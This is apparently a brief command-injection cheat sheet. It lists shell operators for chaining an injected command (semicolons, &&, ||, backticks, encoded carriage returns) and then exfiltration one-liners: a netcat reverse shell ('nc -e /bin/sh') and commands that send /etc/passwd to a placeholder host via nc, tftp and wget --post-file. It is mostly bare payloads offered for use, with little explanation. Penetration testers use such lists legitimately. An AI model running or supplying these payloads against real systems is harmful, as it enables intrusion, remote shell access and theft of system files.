   Executing Commands

Seperating Commands: 
blah;blah2

PIPEZ: 
blah ^ blah2

AND: 
blah && blah2

OR: 
FAIL || X

OR: 
blah%0Dblah2%0Dblah3

Backtick: 
`blah`

Background: 
`blah & blah2`



   Getting Files / Data

FTP: 
Make a new text, and echo and then redirect to FTP

NC: 
nc -e /bin/sh

NC: 
echo /etc/passwd  | nc host port

TFTP: 
echo put /etc/passwd | tftp host

WGET: 
wget --post-file /etc/passwd
